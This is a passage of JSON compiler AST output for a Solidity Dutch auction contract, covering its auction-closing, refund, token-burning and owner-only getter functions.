(address,uint256,uint256)"}},"id":1739,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9423:165:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1740,"nodeType":"EmitStatement","src":"9418:170:7"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1605,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1603,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"7988:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1604,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"7992:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7988:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1742,"initializationExpression":{"assignments":[1600],"declarations":[{"constant":false,"id":1600,"mutability":"mutable","name":"i","nameLocation":"7981:1:7","nodeType":"VariableDeclaration","scope":1742,"src":"7976:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1599,"name":"uint","nodeType":"ElementaryTypeName","src":"7976:4:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1602,"initialValue":{"hexValue":"30","id":1601,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7985:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"7976:10:7"},"loopExpression":{"expression":{"id":1607,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"8009:3:7","subExpression":{"id":1606,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8009:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1608,"nodeType":"ExpressionStatement","src":"8009:3:7"},"nodeType":"ForStatement","src":"7971:1628:7"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1745,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1743,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"9613:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1744,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9628:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9613:16:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1764,"nodeType":"Block","src":"9695:131:7","statements":[{"expression":{"id":1754,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1751,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"9709:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1752,"name":"AuctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1057,"src":"9726:12:7","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_AuctionState_$1057_$","typeString":"type(enum Dutch_Auction.AuctionState)"}},"id":1753,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"9739:7:7","memberName":"CLOSING","nodeType":"MemberAccess","referencedDeclaration":1056,"src":"9726:20:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"src":"9709:37:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"id":1755,"nodeType":"ExpressionStatement","src":"9709:37:7"},{"expression":{"id":1758,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1756,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"9760:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1757,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9781:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9760:22:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1759,"nodeType":"ExpressionStatement","src":"9760:22:7"},{"expression":{"id":1762,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1760,"name":"prematureEnd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1031,"src":"9796:12:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"74727565","id":1761,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"9811:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"src":"9796:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1763,"nodeType":"ExpressionStatement","src":"9796:19:7"}]},"id":1765,"nodeType":"IfStatement","src":"9609:217:7","trueBody":{"id":1750,"nodeType":"Block","src":"9631:58:7","statements":[{"expression":{"id":1748,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1746,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"9645:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1747,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"9666:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9645:33:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1749,"nodeType":"ExpressionStatement","src":"9645:33:7"}]}}]},"functionSelector":"ca77ab65","id":1767,"implemented":true,"kind":"function","modifiers":[],"name":"calculate","nameLocation":"7860:9:7","nodeType":"FunctionDefinition","parameters":{"id":1590,"nodeType":"ParameterList","parameters":[],"src":"7869:2:7"},"returnParameters":{"id":1591,"nodeType":"ParameterList","parameters":[],"src":"7879:0:7"},"scope":1950,"src":"7851:1981:7","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":1809,"nodeType":"Block","src":"9867:363:7","statements":[{"expression":{"id":1773,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1770,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"9877:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1771,"name":"AuctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1057,"src":"9894:12:7","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_AuctionState_$1057_$","typeString":"type(enum Dutch_Auction.AuctionState)"}},"id":1772,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"9907:7:7","memberName":"CLOSING","nodeType":"MemberAccess","referencedDeclaration":1056,"src":"9894:20:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"src":"9877:37:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"id":1774,"nodeType":"ExpressionStatement","src":"9877:37:7"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":1775,"name":"calculate","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1767,"src":"9924:9:7","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":1776,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9924:11:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1777,"nodeType":"ExpressionStatement","src":"9924:11:7"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":1778,"name":"refundETH","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1589,"src":"9945:9:7","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":1779,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9945:11:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1780,"nodeType":"ExpressionStatement","src":"9945:11:7"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":1781,"name":"sendTokens","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1512,"src":"9966:10:7","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":1782,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9966:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1783,"nodeType":"ExpressionStatement","src":"9966:12:7"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1786,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1784,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"9992:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1785,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10013:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9992:22:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1798,"nodeType":"IfStatement","src":"9988:100:7","trueBody":{"id":1797,"nodeType":"Block","src":"10016:72:7","statements":[{"expression":{"arguments":[{"arguments":[{"id":1792,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"10051:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1791,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10043:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1790,"name":"address","nodeType":"ElementaryTypeName","src":"10043:7:7","typeDescriptions":{}}},"id":1793,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10043:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1794,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"10058:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":1787,"name":"DAToken","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1034,"src":"10030:7:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"id":1789,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"10038:4:7","memberName":"burn","nodeType":"MemberAccess","referencedDeclaration":2017,"src":"10030:12:7","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256) external"}},"id":1795,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10030:47:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1796,"nodeType":"ExpressionStatement","src":"10030:47:7"}]}},{"eventCall":{"arguments":[{"id":1800,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"10131:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1801,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"10160:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"arguments":[{"id":1804,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"10200:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1803,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10192:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1802,"name":"address","nodeType":"ElementaryTypeName","src":"10192:7:7","typeDescriptions":{}}},"id":1805,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10192:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1806,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"10206:7:7","memberName":"balance","nodeType":"MemberAccess","src":"10192:21:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1799,"name":"endAuctionEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1203,"src":"10102:15:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_uint256_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (uint256,uint256,uint256)"}},"id":1807,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10102:121:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1808,"nodeType":"EmitStatement","src":"10097:126:7"}]},"functionSelector":"fe67a54b","id":1810,"implemented":true,"kind":"function","modifiers":[],"name":"endAuction","nameLocation":"9847:10:7","nodeType":"FunctionDefinition","parameters":{"id":1768,"nodeType":"ParameterList","parameters":[],"src":"9857:2:7"},"returnParameters":{"id":1769,"nodeType":"ParameterList","parameters":[],"src":"9867:0:7"},"scope":1950,"src":"9838:392:7","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":1820,"nodeType":"Block","src":"10340:43:7","statements":[{"expression":{"id":1818,"name":"totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1019,"src":"10357:19:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1817,"id":1819,"nodeType":"Return","src":"10350:26:7"}]},"documentation":{"id":1811,"nodeType":"StructuredDocumentation","src":"10236:28:7","text":"View and Pure Function "},"functionSelector":"df385306","id":1821,"implemented":true,"kind":"function","modifiers":[{"id":1814,"kind":"modifierInvocation","modifierName":{"id":1813,"name":"onlyOwner","nameLocations":["10312:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"10312:9:7"},"nodeType":"ModifierInvocation","src":"10312:9:7"}],"name":"retrieveTotalAlgos","nameLocation":"10279:18:7","nodeType":"FunctionDefinition","parameters":{"id":1812,"nodeType":"ParameterList","parameters":[],"src":"10297:2:7"},"returnParameters":{"id":1817,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1816,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1821,"src":"10331:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1815,"name":"uint256","nodeType":"ElementaryTypeName","src":"10331:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10330:9:7"},"scope":1950,"src":"10270:113:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1830,"nodeType":"Block","src":"10461:36:7","statements":[{"expression":{"id":1828,"name":"reservePrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1015,"src":"10478:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1827,"id":1829,"nodeType":"Return","src":"10471:19:7"}]},"functionSelector":"14df33ac","id":1831,"implemented":true,"kind":"function","modifiers":[{"id":1824,"kind":"modifierInvocation","modifierName":{"id":1823,"name":"onlyOwner","nameLocations":["10433:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"10433:9:7"},"nodeType":"ModifierInvocation","src":"10433:9:7"}],"name":"retrieveReservePrice","nameLocation":"10398:20:7","nodeType":"FunctionDefinition","parameters":{"id":1822,"nodeType":"ParameterList","parameters":[],"src":"10418:2:7"},"returnParameters":{"id":1827,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1826,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1831,"src":"10452:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1825,"name":"uint256","nodeType":"ElementaryTypeName","src":"10452:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10451:9:7"},"scope":1950,"src":"10389:108:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1838,"nodeType":"Block","src":"10564:36:7","statements":[{"expression":{"id":1836,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"10581:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":1835,"id":1837,"nodeType":"Return","src":"10574:19:7"}]},"functionSelector":"0b324808","id":1839,"implemented":true,"kind":"function","modifiers":[],"name":"retrieveCurrentPrice","nameLocation":"10512:20:7","nodeType":"FunctionDefinition","parameters":{"id":1832,"nodeType":"ParameterList","parameters":[],"src":"10532:2:7"},"returnParameters":{"id":1835,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1834,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1839,"src":"10556:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":1833,"name":"int256","nodeType":"ElementaryTypeName","src":"10556:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"10555:8:7"},"scope":1950,"src":"10503:97:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1848,"nodeType":"Block","src":"10677:39:7","statements":[{"expression":{"id":1846,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"10694:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1845,"id":1847,"nodeType":"Return","src":"10687:22:7"}]},"functionSelector":"e4655bca","id":1849,"implemented":true,"kind":"function","modifiers":[{"id":1842,"kind":"modifierInvocation","modifierName":{"id":1841,"name":"onlyOwner","nameLocations":["10649:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"10649:9:7"},"nodeType":"ModifierInvocation","src":"10649:9:7"}],"name":"retrieveTotalBidder","nameLocation":"10615:19:7","nodeType":"FunctionDefinition","parameters":{"id":1840,"nodeType":"ParameterList","parameters":[],"src":"10634:2:7"},"returnParameters":{"id":1845,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1844,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1849,"src":"10668:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1843,"name":"uint256","nodeType":"ElementaryTypeName","src":"10668:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10667:9:7"},"scope":1950,"src":"10606:110:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1856,"nodeType":"Block","src":"10785:31:7","statements":[{"expression":{"id":1854,"name":"i_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1017,"src":"10802:7:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1853,"id":1855,"nodeType":"Return","src":"10795:14:7"}]},"functionSelector":"ac5ece6d","id":1857,"implemented":true,"kind":"function","modifiers":[],"name":"retrieveContractOwner","nameLocation":"10731:21:7","nodeType":"FunctionDefinition","parameters":{"id":1850,"nodeType":"ParameterList","parameters":[],"src":"10752:2:7"},"returnParameters":{"id":1853,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1852,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1857,"src":"10776:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1851,"name":"address","nodeType":"ElementaryTypeName","src":"10776:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"10775:9:7"},"scope":1950,"src":"10722:94:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1870,"nodeType":"Block","src":"10897:45:7","statements":[{"expression":{"expression":{"arguments":[{"id":1866,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"10922:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1865,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10914:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1864,"name":"address","nodeType":"ElementaryTypeName","src":"10914:7:7","typeDescriptions":{}}},"id":1867,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10914:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1868,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"10928:7:7","memberName":"balance","nodeType":"MemberAccess","src":"10914:21:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1863,"id":1869,"nodeType":"Return","src":"10907:28:7"}]},"functionSelector":"7ded653f","id":1871,"implemented":true,"kind":"function","modifiers":[{"id":1860,"kind":"modifierInvocation","modifierName":{"id":1859,"name":"onlyOwner","nameLocations":["10869:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"10869:9:7"},"nodeType":"ModifierInvocation","src":"10869:9:7"}],"name":"retrieveContractBalance","nameLocation":"10831:23:7","nodeType":"FunctionDefinition","parameters":{"id":1858,"nodeType":"ParameterList","parameters":[],"src":"10854:2:7"},"returnParameters":{"id":1863,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1862,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1871,"src":"10888:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1861,"name":"uint256","nodeType":"ElementaryTypeName","src":"10888:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10887:9:7"},"scope":1950,"src":"10822:120:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1885,"nodeType":"Block","src":"11050:52:7","statements":[{"expression":{"expression":{"baseExpression":{"id":1880,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"11067:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1882,"indexExpression":{"id":1881,"name":"bidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1873,"src":"11079:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"11067:19:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1883,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"11087:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"11067:28:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1879,"id":1884,"nodeType":"Return","src":"11060:35:7"}]},"functionSelector":"1f732088","id":1886,"implemented":true,"kind":"function","modifiers":[{"id":1876,"kind":"modifierInvocation","modifierName":{"id":1875,"name":"onlyOwner","nameLocations":["11022:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"11022:9:7"},"nodeType":"ModifierInvocation","src":"11022:9:7"}],"name":"retrieveBidderBidValue","nameLocation":"10957:22:7","nodeType":"FunctionDefinition","parameters":{"id":1874,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1873,"mutability":"mutable","name":"bidder","nameLocation":"10997:6:7","nodeType":"VariableDeclaration","scope":1886,"src":"10989:14:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1872,"name":"uint256","nodeType":"ElementaryTypeName","src":"10989:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10979:30:7"},"returnParameters":{"id":1879,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1878,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1886,"src":"11041:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1877,"name":"uint256","nodeType":"ElementaryTypeName","src":"11041:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11040:9:7"},"scope":1950,"src":"10948:154:7","stateMutability":"view","virtual":false,"visibility":"public"},{"body":{"id":1900,"nodeType":"Block","src":"11207:63:7","statements":[{"expression":{"expression":{"baseExpression":{"id":1895,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"11224:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1897,"indexExpression":{"id":1896,"name":"bidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1888,"src":"11236:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"11224:19:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage 